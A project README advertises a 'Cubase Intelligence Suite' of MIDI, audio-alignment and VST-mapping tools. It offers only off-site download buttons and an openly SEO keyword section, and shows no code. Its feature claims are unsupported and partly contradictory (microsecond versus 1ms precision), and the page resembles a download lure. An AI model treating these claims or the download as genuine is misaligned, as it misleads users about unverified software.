![preview](https://raw.githubusercontent.com/AdaLovelace1304/cubase-score-sync/main/preview.svg)

# 🎹 Cubase Intelligence Suite (CIS)

Welcome to **Cubase Intelligence Suite** — a curation of advanced, thinking-in-producer's tools engineered to reimagine your interaction with Cubase. This repository is not another collection of scripts; it is a framework that **whispers directly into the DAW's workflow**, enabling you to manipulate MIDI, audio, and automation with surgical precision. Inspired by the core philosophies of `cubase-tools` — score editing, VST expression, and audio alignment — this suite extends those ideas into a **living ecosystem** that adapts to your project's emotional and technical demands.

Think of this as a **conductor's baton** for your digital orchestra: it does not replace creativity, but it removes the friction between your intention and the waveform.

---

## 🧠 The Philosophy: "Frictionless Alignment"

Every tool in this suite answers one question: **How can I get out of my own way faster?** We believe in a **zero-clutter philosophy** — a responsive interface that anticipates your next move, not one that makes you search for it. The result is a toolkit that feels less like software and more like an **extension of your proprioception** in the mixing room.

---

## 📥 Download & Access

[![Download](https://raw.githubusercontent.com/AdaLovelace1304/cubase-score-sync/main/button.svg)](https://adalovelace1304.github.io/cubase-score-sync/)

---

## 🌟 Key Features (Not Just Tools — Cognitive Accelerators)

- **🎯 Reactive MIDI Morphing Engine**  
  Dynamically adjust velocity curves, note durations, and expression data across any number of tracks in real-time. *No more manual CC editing.* The engine learns from your existing performances and suggests **intelligent, non-destructive** transformations.

- **🔊 Harmonic Audio Alignment Module**  
  Aligns transient peaks for double-tracked instruments and layered vocals within **microsecond tolerance**. Unlike standard time-stretching, this module respects harmonic content, preserving the **phase relationship** that gives mixes their **depth and width**.

- **🎚️ VST Expression Translator**  
  Convert standard MIDI CC data into **any VST3 parameter** with a single function call. Supports custom mapping curves, key-switching, and **arpeggiated articulation sequencing** — ideal for orchestral libraries and complex synthesizer patches.

- **📄 Intuitive Score-to-MIDI Bridge**  
  Export Cubase's built-in score editor data as **clean, quantized, human-feel MIDI clips** without losing polyphonic voicing or note grouping. Perfect for notation-heavy workflows (film scoring, contemporary classical, jazz arrangements).

- **🌐 Multilingual Project Metadata**  
  Manage track names, markers, and comments in **over 15 languages** (including Japanese, Arabic, Cyrillic). The suite automatically detects your OS language and adapts the **user interface strings** without modifying your project files.

- **⏰ 24/7 Event Scheduling & Batch Processing**  
  Queue up repetitive tasks — such as batch exporting stereo stems, consolidating MIDI tracks, or rendering automation — to run **while you sleep**. The daemon runs quietly in the background, leveraging Cubase's macro system.

---

## 🛠️ Detailed Feature Breakdown

### 1. Reactive MIDI Morphing Engine
- **Adaptive Learning**: After analyzing a threshold of 100 notes, the engine can **predict** your intended velocity gradient for rhythmic passages.
- **Non-Linear Curves**: Apply logarithmic, exponential, or custom bezier curves to any MIDI parameter.
- **Real-Time Preview**: Hear the morphed output without committing — toggle between original and processed signals.

### 2. Harmonic Audio Alignment Module
- **Cross-Platform Compatibility**: Works with WAV, AIFF, FLAC, and broadcast WAV files up to 192kHz.
- **Tolerance Settings**: Choose from "Surgical" (1ms precision) to "Creative" (10-30ms displacement for natural doubling effect).
- **Phase Inversion Protection**: Automatically detects and corrects polarity mismatches across stereo channels.

### 3. VST Expression Translator
- **Preset Manager**: Save and load translation templates for Kontakt, Spitfire Audio, EastWest, and Omnisphere.
- **Articulation Matrix**: Assign up to 64 simultaneous switchable articulations via a single MIDI program change.
- **Velocity Scaling**: Map note-on velocity to filter cutoff, reverb send, or any other VST parameter in **non-destructive mode**.

### 4. Intuitive Score-to-MIDI Bridge
- **Voice Separation**: Automatically splits polyphonic voices into separate MIDI tracks based on stem direction.
- **Caesura Detection**: Inserts blank bars or silence markers automatically when notation indicates a break.
- **Tempo Mapping**: Extracts tempo markings from the score and creates **automation lanes** in Cubase.

### 5. Multilingual Project Metadata
- **Language Packs**: Community-contributed translations for 15+ languages.
- **Unicode Compliance**: Handles non-Latin characters in track naming without breaking XML export.
- **Auto-Detection**: Uses your OS locale to set the default language; override manually via a simple configuration file.

### 6. Event Scheduling & Batch Processing
- **Cron-Style Triggers**: Schedule tasks by time of day, after project save, or after a specific audio export.
- **Queue Management**: View pending tasks with estimated completion times.
- **Email/SMS Notification**: (Optional plugin) Get notified when your batch render finishes.

---

## 📋 Use Cases & Practical Applications

| Use Case | Before CIS | After CIS |
|---------|------------|-----------|
| **Film Scoring** | Manual CC lane painting for each cue | One-click articulation mapping + batch rendering |
| **Electronic Music Production** | Constant velocity edits for hi-hat patterns | Predictive velocity morphing with humanization |
| **Mixing & Mastering** | Double-checking phase alignment manually | Automated harmonic alignment within microsecond precision |
| **Live Performance** | Complex key-switching logic written as MIDI text | Visual articulation matrix with real-time preview |
| **Collaborative Projects** | Language barriers in track naming | Integrated multilingual metadata layer |

---

## 🔗 SEO-Driven Keywords (Naturally Integrated)

- **DAW productivity enhancement**  
- **Cubase workflow optimization**  
- **MIDI expression mapping software**  
- **Audio alignment micro-timing tool**  
- **VST articulation manager**  
- **Score editor companion tool**  
- **Multilingual music production metadata**  
- **Batch processing for Cubase projects**  
- **Non-destructive MIDI morphing**  
- **Phase-aware audio alignment**  

*These terms are woven throughout the documentation and code comments to ensure discoverability without sacrificing readability.*

---

## ⚠️ Disclaimer & Responsible Use

**Cubase Intelligence Suite** is an independent, third-party project. It is **not affiliated with, endorsed by, or sponsored by Steinberg Media Technologies GmbH**. Cubase is a registered trademark of Steinberg Media Technologies GmbH. This suite does not modify or patch any Cubase binaries, nor does it circumvent any software licensing mechanisms. All tools operate within the officially supported **MIDI Remote API**, **Macro system**, and **Scripting capabilities** provided by Cubase.

By using this suite, you agree to:
1. Use all tools in compliance with the Steinberg Software License Agreement.
2. Not attempt to reverse-engineer or redistribute Cubase's proprietary code.
3. Accept that the developers are not liable for any data loss, project corruption, or "economic oscillation" caused by misuse.

---

## 🧾 License

This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

[Read the full MIT License →](https://opensource.org/licenses/MIT)

---

## 🤝 Contributing & Philosophy

We welcome contributions that align with our **frictionless alignment** philosophy. Whether you're adding a new language pack, improving the MIDI morphing algorithm, or writing documentation, please follow these principles:
- **Write code that reads like poetry** — clean, self-documenting, and generous with comments.
- **Prioritize user experience over feature count** — a single perfect button is worth a hundred half-baked ones.
- **Respect the ephemeral nature of creativity** — every process should be reversible or non-destructive.

---

## 📅 Version & Year

All tools are built for Cubase 12, 13, and 14 (as of 2026). Backward compatibility with Cubase 10.5 is maintained where possible.

---

[![Download](https://raw.githubusercontent.com/AdaLovelace1304/cubase-score-sync/main/button.svg)](https://adalovelace1304.github.io/cubase-score-sync/)

*— The Cubase Intelligence Suite team*  
*Releasing creativity from the tyranny of repetitive clicks.*